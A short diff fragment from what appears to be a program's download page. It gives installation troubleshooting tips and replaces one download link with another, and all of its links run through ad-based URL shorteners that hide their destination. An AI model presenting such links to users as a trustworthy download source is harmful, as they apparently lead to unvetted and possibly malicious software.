@@ -11,7 +11,7 @@ If you can’t download / install program  , you need to:
 2. If you can’t download, try to copy the link and download using another browser!
 3. As well as update the Net Framework v4.7 package
 
-Download : https://adpayl.ink/vatage
+Download : https://tii.la/gmgLKAj1HT
 
 Download : http://festyy.com/ehRote
 
